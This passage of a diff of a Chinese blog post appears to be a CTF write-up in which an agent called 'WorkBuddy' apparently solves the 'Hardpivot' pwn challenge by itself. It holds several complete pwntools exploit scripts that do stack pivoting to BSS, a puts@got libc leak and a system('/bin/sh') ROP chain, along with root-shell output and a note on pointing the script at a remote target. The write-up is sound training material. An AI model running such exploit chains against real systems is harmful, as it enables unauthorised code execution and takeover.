class="hljs-number">0</span><br>  <span class="hljs-keyword">ret</span>    = [BSS1+<span class="hljs-number">0x20</span>] = POP_RDI<br>  <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> = [BSS1+<span class="hljs-number">0x28</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span><br>  <span class="hljs-keyword">ret</span>    = [BSS1+<span class="hljs-number">0x30</span>] = system → SHELL!<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="0x05-最终-Exploit"><a href="#0x05-最终-Exploit" class="headerlink" title="0x05 最终 Exploit"></a><strong>0x05 最终 Exploit</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>POP_RDI    = <span class="hljs-number">0x40119e</span><br>POP_RBP    = <span class="hljs-number">0x40117d</span><br>RET        = <span class="hljs-number">0x40101a</span><br>VULN_MID   = <span class="hljs-number">0x401264</span><br>PUTS_PLT   = <span class="hljs-number">0x401070</span><br>PUTS_GOT   = <span class="hljs-number">0x404018</span><br>BSS1       = <span class="hljs-number">0x404800</span>  <span class="hljs-comment"># 第一轮泄露链</span><br>BSS2       = <span class="hljs-number">0x404A00</span>  <span class="hljs-comment"># 第二轮 system 链（不重叠）</span><br><br>p = process(<span class="hljs-string">&#x27;/home/kali/Desktop/hardpivot/pwn&#x27;</span>)<br><span class="hljs-comment"># 远程：p = remote(&#x27;host&#x27;, port)</span><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br><br><span class="hljs-comment"># ===== Stage 1: Leak libc =====</span><br>overflow1 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">64</span> + p64(BSS1 + <span class="hljs-number">0x98</span>) + p64(VULN_MID)<br>p.send(overflow1)<br><br>first_bss  = p64(<span class="hljs-number">0</span>) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)<br>first_bss += p64(POP_RBP) + p64(BSS2 + <span class="hljs-number">0x98</span>) + p64(VULN_MID)<br>first_bss += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">8</span> + p64(BSS1 + <span class="hljs-number">0x50</span>) + p64(VULN_MID)<br>p.send(first_bss)<br><br>second_bss = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">64</span> + p64(<span class="hljs-number">0</span>) + p64(RET)<br>p.send(second_bss)<br><br><span class="hljs-comment"># 接收泄露的 libc puts 地址</span><br>leak_raw = p.recv(<span class="hljs-number">6</span>)<br>libc_puts = u64(leak_raw.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = libc_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr  = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br><span class="hljs-comment"># ===== Stage 2: System =====</span><br>first_bss2  = p64(<span class="hljs-number">0</span>) + p64(POP_RDI) + p64(binsh_addr) + p64(system_addr)<br>first_bss2 += p64(<span class="hljs-number">0xdeadbeef</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">24</span><br>first_bss2 += p64(BSS2 + <span class="hljs-number">0x50</span>) + p64(VULN_MID)<br>p.send(first_bss2)<br><br>second_bss2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">64</span> + p64(<span class="hljs-number">0</span>) + p64(RET)<br>p.send(second_bss2)<br><br>p.sendline(<span class="hljs-string">b&#x27;id&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(p.recvall(timeout=<span class="hljs-number">3</span>).decode())<br></code></pre></td></tr></table></figure>
+<h4 id="0x05-最终-Exploit"><a href="#0x05-最终-Exploit" class="headerlink" title="0x05 最终 Exploit"></a><strong>0x05 最终 Exploit</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br>POP_RDI     = <span class="hljs-number">0x40119e</span><br>POP_RBP     = <span class="hljs-number">0x40117d</span><br>RET         = <span class="hljs-number">0x40101a</span><br>LEAVE_RET   = <span class="hljs-number">0x40127b</span><br>LEA_RBX_M40 = <span class="hljs-number">0x401264</span>   <span class="hljs-comment"># lea rax,[rbp-0x40]; mov edx,0x50;</span><br>                         <span class="hljs-comment"># mov rsi,rax; mov edi,0; call read; leave;ret</span><br>PUTS_PLT    = <span class="hljs-number">0x401070</span><br>PUTS_GOT    = <span class="hljs-number">0x404018</span><br>BSS1        = <span class="hljs-number">0x404800</span><br><br>p = process(<span class="hljs-string">&#x27;/home/kali/Desktop/hardpivot/pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br><br><span class="hljs-comment"># === Round 0: Overflow ===</span><br>overflow = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">64</span> + p64(BSS1 + <span class="hljs-number">0x98</span>) + p64(LEA_RBX_M40)<br>p.send(overflow)<br><br><span class="hljs-comment"># === Round 1: Leak chain at BSS1+0x58 ===</span><br>w1  = p64(<span class="hljs-number">0</span>)                       <span class="hljs-comment"># +0x58 junk</span><br>w1 += p64(<span class="hljs-number">0</span>)                       <span class="hljs-comment"># +0x60 junk</span><br>w1 += p64(BSS1 + <span class="hljs-number">0x58</span>)             <span class="hljs-comment"># +0x68 pop rbp → BSS1+0x58</span><br>w1 += p64(POP_RDI)                 <span class="hljs-comment"># +0x70</span><br>w1 += p64(PUTS_GOT)                <span class="hljs-comment"># +0x78</span><br>w1 += p64(PUTS_PLT)                <span class="hljs-comment"># +0x80 → LEAK!</span><br>w1 += p64(LEA_RBX_M40)             <span class="hljs-comment"># +0x88 ret to 0x401264</span><br>w1 += p64(<span class="hljs-number">0</span>)                       <span class="hljs-comment"># +0x90 padding</span><br>w1 += p64(BSS1 + <span class="hljs-number">0x68</span>)             <span class="hljs-comment"># +0x98 saved rbp</span><br>w1 += p64(LEAVE_RET)               <span class="hljs-comment"># +0xA0 ret</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(w1) == <span class="hljs-number">80</span><br>p.send(w1)<br><br><span class="hljs-comment"># 接收 puts(puts@got) 泄露</span><br>leak_raw = p.recv(<span class="hljs-number">6</span>)<br>leaked_puts = u64(leak_raw.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leaked_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr  = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh     = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br><span class="hljs-comment"># === Round 2: System chain at BSS1+0x18 ===</span><br>w2 = p64(<span class="hljs-number">0</span>)                        <span class="hljs-comment"># +0x18 popped rbp (0)</span><br>w2 += p64(POP_RDI)                 <span class="hljs-comment"># +0x20</span><br>w2 += p64(binsh)                   <span class="hljs-comment"># +0x28</span><br>w2 += p64(sys_addr)                <span class="hljs-comment"># +0x30</span><br>w2 += <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">64</span> - <span class="hljs-built_in">len</span>(w2))    <span class="hljs-comment"># padding to offset 64</span><br>w2 += p64(BSS1 + <span class="hljs-number">0x18</span>)             <span class="hljs-comment"># +0x58 saved rbp</span><br>w2 += p64(LEAVE_RET)               <span class="hljs-comment"># +0x60 ret</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(w2) == <span class="hljs-number">80</span><br>p.send(w2)<br><br><span class="hljs-comment"># Shell</span><br>time.sleep(<span class="hljs-number">0.5</span>)<br>p.sendline(<span class="hljs-string">b&#x27;id&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;cat /home/kali/Desktop/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(p.recvall(timeout=<span class="hljs-number">3</span>).decode())<br>p.close()<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="0x06-执行结果"><a href="#0x06-执行结果" class="headerlink" title="0x06 执行结果"></a><strong>0x06 执行结果</strong></h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[+] libc_base: 0x7fdfaaa00000<br>[+] system: 0x7fdfaaa50d70<br><br><span class="hljs-section">=== OUTPUT ===</span><br>用户id=0(root) 组id=0(root) 组=0(root)<br>flag&#123;qqqqqq111111qqqqqqqok!!!&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="0x06-执行结果"><a href="#0x06-执行结果" class="headerlink" title="0x06 执行结果"></a><strong>0x06 执行结果</strong></h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[+] libc base: 0x7ffbc2a00000<br>[+] system: 0x7ffbc2a50d70<br><span class="hljs-section">=== OUTPUT ===</span><br>用户id=0(root) 组id=0(root) 组=0(root)<br>flag&#123;qqqqqq111111qqqqqqqok!!!&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>Flag: <code>flag&#123;qqqqqq111111qqqqqqqok!!!&#125;</code></strong></p>
 <hr>
-<h4 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a><strong>0x07 总结</strong></h4><table>
+<h4 id="0x07-难点突破与关键发现"><a href="#0x07-难点突破与关键发现" class="headerlink" title="0x07 难点突破与关键发现"></a><strong>0x07 难点突破与关键发现</strong></h4><table>
 <thead>
 <tr>
 <th>难点</th>
@@ -436,75 +425,63 @@
 </tr>
 </thead>
 <tbody><tr>
-<td>80 字节文件写入限制</td>
-<td>双 BSS pivot，利用写入偏移不重叠保留数据</td>
+<td>80 字节写入限制</td>
+<td>LEAVE_RET pivot 到 BSS 预写数据</td>
 </tr>
 <tr>
-<td>栈迁移目标地址不可用</td>
-<td>先通过 VULN_MID 写入 BSS 预填，再 leave;ret 迁移</td>
+<td>0x401264 入口是否安全</td>
+<td>反汇编确认无内存写操作，<code>lea → mov → mov → mov → call read → leave;ret</code></td>
 </tr>
 <tr>
 <td>system 栈对齐</td>
-<td>RET gadget 对齐 rsp 到 16n+8</td>
+<td>leave;ret pivot 后 rsp % 16 &#x3D;&#x3D; 0x18，POP_RDI 占一次 ret 后符合 system 要求</td>
 </tr>
 <tr>
-<td>pop rdi 需要两个参数</td>
-<td>BSS 预填 POP_RDI + binsh_addr</td>
+<td>无 libc 泄露</td>
+<td>puts(puts@got) 输出 6 字节 libc 地址</td>
 </tr>
 <tr>
-<td>无 libc 基地址泄露</td>
-<td>第一轮用 puts(puts@got) 打印 libc 地址，第二轮用泄露值计算 system</td>
+<td>泄露后需第二次写入</td>
+<td>泄露链末尾返回 0x401264，read 读取第二轮 system 链</td>
 </tr>
 </tbody></table>
-<p><strong>核心创新：</strong> 第一次 BSS 写入在 <code>BSS+0x60</code> 放 <code>POP_RDI</code> 和后续参数，第二次写入从 <code>BSS+0x10</code> 开始，leave 从 <code>BSS+0x58</code> 取 RET，<code>BSS+0x60</code> 正好是第二次写入的第 80 字节——完美避开了覆盖。</p>
-<p><strong>两轮泄露 + system 流程：</strong></p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Overflow1</span> → <span class="hljs-selector-tag">BSS1</span> <span class="hljs-selector-tag">Pivot</span>(leak chain) → <span class="hljs-selector-tag">puts</span>(puts<span class="hljs-variable">@got</span>) 打印 <span class="hljs-number">6</span> 字节 <span class="hljs-selector-tag">libc</span> 地址<br>→ <span class="hljs-selector-tag">recv</span> 解析 → 计算 <span class="hljs-selector-tag">system</span>/<span class="hljs-selector-tag">binsh</span> → <span class="hljs-selector-tag">BSS2</span> <span class="hljs-selector-tag">Pivot</span>(system chain) → <span class="hljs-selector-tag">SHELL</span>!<br></code></pre></td></tr></table></figure>
+<p><strong>关键发现：0x401264 的入口点</strong></p>
+<p>最关键的突破是发现 <code>0x401264</code> 位于 vuln 函数内部（<code>lea rax,[rbp-0x40]</code>），而不是函数开头。此前分析 Easylibc 时遇到过一个做过 <code>mov [rbp-0x34]</code> 写内存的函数入口，导致 BSS 数据被破坏。但 hardpivot 的代码不同——0x401264 之后只有纯粹的读&#x2F;调用指令，<strong>完全不会破坏 BSS 缓冲区的数据</strong>。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x401264</span>: <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x40</span>]   # 纯读 <span class="hljs-built_in">rbp</span><br><span class="hljs-number">0x401268</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x50</span>         # 设常量<br><span class="hljs-number">0x40126d</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span>          # 传参<br><span class="hljs-number">0x401270</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edi</span>,<span class="hljs-number">0</span>            # 传参<br><span class="hljs-number">0x401275</span>: <span class="hljs-keyword">call</span> read            # 用户输入进入 BSS<br><span class="hljs-number">0x40127a</span>: <span class="hljs-keyword">nop</span>                  # 无写操作<br><span class="hljs-number">0x40127b</span>: <span class="hljs-keyword">leave</span><br><span class="hljs-number">0x40127c</span>: <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>两次 LEAVE_RET 的 pivot 链（完整执行流）：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Overflow → 0x401264 (<span class="hljs-attribute">rbp</span>=BSS1+0x98, <span class="hljs-attribute">buf</span>=BSS1+0x58)<br>  read w1[80B] → leave → <span class="hljs-attribute">ret</span>=LEAVE_RET<br>  LEAVE_RET → pivot BSS1+0x68 → POP_RDI → PUTS_GOT → PUTS_PLT → LEAK!<br>  收到 6 字节 → 计算 → ret 0x401264 (<span class="hljs-attribute">rbp</span>=BSS1+0x58, <span class="hljs-attribute">buf</span>=BSS1+0x18)<br><br>  read w2[80B] → leave → <span class="hljs-attribute">ret</span>=LEAVE_RET<br>  LEAVE_RET → pivot BSS1+0x18 → POP_RDI → binsh →<span class="hljs-built_in"> system </span>→ SHELL!<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h4 id="0x08-第二种写法：LEAVE-RET-精简方案"><a href="#0x08-第二种写法：LEAVE-RET-精简方案" class="headerlink" title="0x08 第二种写法：LEAVE_RET 精简方案"></a><strong>0x08 第二种写法：LEAVE_RET 精简方案</strong></h4><p>在分析过程中探索了另一种更精简的写法：利用 <code>LEAVE_RET</code>（<code>0x40127b</code>）直接迁移到预写的 system 链，省去第二轮 double BSS pivot 的部分步骤。</p>
-<p><strong>思路：</strong> 泄露链末尾的 <code>POP_RBP</code> 不再跳到 <code>VULN_MID</code>，而是跳到 <code>LEAVE_RET</code>，直接迁移到 <code>BSS1+0x10</code>——该位置在第二轮写入时已被覆盖，可以预埋 system 链。</p>
-<p><strong>约束：</strong> system 链需要 libc 地址（<code>system</code>、<code>/bin/sh</code>），而泄露发生前不知道基址。此方案仅适用于<strong>已知 libc 基址</strong>的场景（如本地调试时通过 <code>/proc/pid/maps</code> 获取，或 ASLR 关闭时）。</p>
-<p><strong>LEAVE_RET 链布局：</strong></p>
-<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">写入1 (BSS1<span class="hljs-string">+0</span>x58): 泄露链 + POP_RBP + BSS1<span class="hljs-string">+0</span>x10 + LEAVE_RET<br>                     BSS1<span class="hljs-string">+0</span>x98: BSS1<span class="hljs-string">+0</span>x50, BSS1<span class="hljs-string">+0</span>xA0: VULN_MID<br>写入2 (BSS1<span class="hljs-string">+0</span>x10):  BSS1<span class="hljs-string">+0</span>x10: 0 (fake rbp)<br>                     BSS1<span class="hljs-string">+0</span>x18: RET (对齐)<br>                     BSS1<span class="hljs-string">+0</span>x20: POP_RDI<br>                     BSS1<span class="hljs-string">+0</span>x28: /bin/sh             ← 预写！需已知 libc<br>                     BSS1<span class="hljs-string">+0</span>x30: system              ← 预写！需已知 libc<br>                     BSS1<span class="hljs-string">+0</span>x38~0x4F: padding<br>                     BSS1<span class="hljs-string">+0</span>x50: 0 (第一轮 fake rbp)<br>                     BSS1<span class="hljs-string">+0</span>x58: RET (第一轮对齐)<br></code></pre></td></tr></table></figure>
+<h4 id="0x08-远程使用"><a href="#0x08-远程使用" class="headerlink" title="0x08 远程使用"></a><strong>0x08 远程使用</strong></h4><p>只需修改一行即可适配远程服务器：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 本地:</span><br>p = process(<span class="hljs-string">&#x27;/home/kali/Desktop/hardpivot/pwn&#x27;</span>)<br><br><span class="hljs-comment"># 远程:</span><br>p = remote(<span class="hljs-string">&#x27;目标IP&#x27;</span>, 端口)<br></code></pre></td></tr></table></figure>
 
-<p><strong>LEAVE_RET 执行链：</strong></p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">puts泄露 → POP_RBP(<span class="hljs-built_in">rbp</span>=BSS1+<span class="hljs-number">0x10</span>) → LEAVE_RET<br>  → <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsp</span>, BSS1+<span class="hljs-number">0x10</span><br>  → <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbp</span> = [BSS1+<span class="hljs-number">0x10</span>] = <span class="hljs-number">0</span><br>  → <span class="hljs-keyword">ret</span> = [BSS1+<span class="hljs-number">0x18</span>] = <span class="hljs-keyword">RET</span><br>  → <span class="hljs-keyword">ret</span> = [BSS1+<span class="hljs-number">0x20</span>] = POP_RDI<br>  → <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> = [BSS1+<span class="hljs-number">0x28</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span><br>  → <span class="hljs-keyword">ret</span> = [BSS1+<span class="hljs-number">0x30</span>] = system → SHELL!<br></code></pre></td></tr></table></figure>
-
-<p><strong>LEAVE_RET 版本 Exploit：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time, os<br><br>POP_RDI    = <span class="hljs-number">0x40119e</span><br>POP_RBP    = <span class="hljs-number">0x40117d</span><br>RET        = <span class="hljs-number">0x40101a</span><br>LEAVE_RET  = <span class="hljs-number">0x40127b</span><br>VULN_MID   = <span class="hljs-number">0x401264</span><br>PUTS_PLT   = <span class="hljs-number">0x401070</span><br>PUTS_GOT   = <span class="hljs-number">0x404018</span><br>BSS1       = <span class="hljs-number">0x404800</span><br><br><span class="hljs-comment"># 先获取 libc 基址 (本地: /proc; 远程: 需先知)</span><br>p = process(<span class="hljs-string">&#x27;/home/kali/Desktop/hardpivot/pwn&#x27;</span>)<br>pid = p.pid<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/proc/<span class="hljs-subst">&#123;pid&#125;</span>/maps&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;libc.so.6&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;r--p 00000000&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            lbase = <span class="hljs-built_in">int</span>(line.split(<span class="hljs-string">&#x27;-&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">break</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>sys_addr = lbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh    = lbase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br><br>over = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">64</span> + p64(BSS1 + <span class="hljs-number">0x98</span>) + p64(VULN_MID)<br>p.send(over)<br><br><span class="hljs-comment"># 写入1: 泄露链 + POP_RBP + BSS1+0x10 + LEAVE_RET</span><br>w1  = p64(<span class="hljs-number">0</span>) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT)<br>w1 += p64(POP_RBP) + p64(BSS1 + <span class="hljs-number">0x10</span>) + p64(LEAVE_RET)<br>w1 += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">8</span> + p64(BSS1 + <span class="hljs-number">0x50</span>) + p64(VULN_MID)<br>p.send(w1)<br><br><span class="hljs-comment"># 写入2: 对齐 + 预埋 system 链</span><br>w2  = p64(<span class="hljs-number">0</span>) + p64(RET) + p64(POP_RDI)<br>w2 += p64(binsh) + p64(sys_addr)<br>w2 += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0</span>) + p64(RET)<br>p.send(w2)<br><br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;leaked_puts: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leak)&#125;</span>, base match: <span class="hljs-subst">&#123;lbase == leak - <span class="hljs-number">0x80e50</span>&#125;</span>&#x27;</span>)<br><br>time.sleep(<span class="hljs-number">0.5</span>)<br>p.sendline(<span class="hljs-string">b&#x27;id; cat /home/kali/Desktop/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(p.recvall(timeout=<span class="hljs-number">3</span>).decode())<br>p.close()<br></code></pre></td></tr></table></figure>
-
+<p>所有 libc 地址均通过 <code>puts(puts@got)</code> 在运行时动态泄露，无需 <code>/proc/pid/maps</code>。</p>
 <hr>
-<h4 id="0x09-两种方案对比"><a href="#0x09-两种方案对比" class="headerlink" title="0x09 两种方案对比"></a><strong>0x09 两种方案对比</strong></h4><table>
+<h4 id="0x09-三题收官"><a href="#0x09-三题收官" class="headerlink" title="0x09 三题收官"></a><strong>0x09 三题收官</strong></h4><table>
 <thead>
 <tr>
-<th>特性</th>
-<th>原始双 BSS pivot</th>
-<th>LEAVE_RET 精简版</th>
+<th>题目</th>
+<th>核心技巧</th>
+<th>难度</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>远程可用</td>
-<td>✅ 完全独立泄露</td>
-<td>❌ 需先知 libc 基址</td>
+<td><strong>EZtext</strong></td>
+<td>ret2win（后门函数 treasure）</td>
+<td>⭐</td>
 </tr>
 <tr>
-<td>数据发送次数</td>
-<td>6 次</td>
-<td>3 次</td>
+<td><strong>Easylibc</strong></td>
+<td>ret2vuln + ret2libc（PIE + libc 泄露）</td>
+<td>⭐⭐</td>
 </tr>
 <tr>
-<td>代码行数</td>
-<td>较长</td>
-<td>更短</td>
-</tr>
-<tr>
-<td>核心限制</td>
-<td>—</td>
-<td>system 链需 libc 地址</td>
+<td><strong>Hardpivot</strong></td>
+<td>LEAVE_RET 写入 BSS 链 + puts 泄露</td>
+<td>⭐⭐⭐</td>
 </tr>
 </tbody></table>
-<p><strong>原始方案</strong> 适用于远程场景，完全通过 <code>puts(puts@got)</code> 泄露获取 libc 基址后二次写入。</p>
-<p><strong>LEAVE_RET 方案</strong> 利用 <code>leave; ret</code> 的栈迁移能力直接跳转到预埋数据，结构更紧凑，但需要预先知道 libc 地址。适合本地调试或 ASLR 关闭的场景。</p>
 <p><strong>WorkBuddy 纯自动解题全系列（EZtext、Easylibc、Hardpivot）记录完毕。</strong> 🚀</p>
 
                 
@@ -549,9 +526,11 @@
       
         <a href="/tags/ret2libc/" class="print-no-link">#ret2libc</a>
       
-        <a href="/tags/stack-pivot/" class="print-no-link">#stack-pivot</a>
+        <a href="/tags/leave-ret/" class="print-no-link">#leave-ret</a>
       
-        <a href="/tags/BSS/" class="print-no-link">#BSS</a>
+        <a href="/tags/BSS-pivot/" class="print-no-link">#BSS-pivot</a>
+      
+        <a href="/tags/ret2puts/" class="print-no-link">#ret2puts</a>
       
     </div>
   
@@ -563,7 +542,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Moe2025 Hardpivot — WorkBuddy 纯自动解题记录（双 BSS pivot 突破 80 字节墙）</div>
